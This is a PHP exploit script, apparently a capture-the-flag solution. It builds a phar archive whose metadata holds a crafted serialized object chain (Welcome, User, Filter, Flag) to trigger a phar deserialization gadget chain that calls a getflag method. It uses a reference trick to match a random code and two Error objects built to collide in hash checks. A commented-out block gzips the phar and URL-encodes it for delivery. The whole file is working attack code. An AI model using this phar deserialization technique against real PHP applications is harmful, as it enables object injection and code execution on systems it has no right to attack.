<?php

class Welcome
{
    public $welcome;
    public $randcode;
    public $code;
    public $sha1;
    public $sha2;
}

class User
{
    public array $basic_info;
    private array $private_info;
    public function __construct(array $basic_info, array $private_info)
    {
        $this->basic_info = $basic_info;
        $this->private_info = $private_info;
    }
}

class Filter
{
    public array $params;
}

class Flag{

}

class fake
{
}

$phar = new Phar("source.phar"); //创建phar文件时后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置存根stub

$flag=new Flag();
$welcome = new Welcome();
$filter = new Filter();
$filter->params=array("birthplace"=>array($flag,"getflag"));
$user = new User(array(1, 2, 3), array("address" => $filter));
$welcome->code =& $welcome->randcode;
$welcome->welcome = $user;
$sha1 = new Error($message = "misaka", $code = 0);$sha2 = new Error($message = "misaka", $code = 1);#不要换行
$welcome->sha1=$sha1;
$welcome->sha2=$sha2;


$fake = new fake();
$a = array($welcome, $fake);
var_dump(serialize($a));

$phar->setMetadata($a); //将自定义的meta-data序列化后存入manifest
$phar->addFromString("a", "a"); //phar本质上是对文件的压缩所以要添加要压缩的文件
$phar->stopBuffering();

/*
$pharfile = "asdf.phar";
$gzipfile = "asdf.gzip";
$fp = gzopen($gzipfile, "w9");
gzwrite($fp, file_get_contents($pharfile));
gzclose($fp);
$fp = file_get_contents($gzipfile);
var_dump(urlencode($fp));*/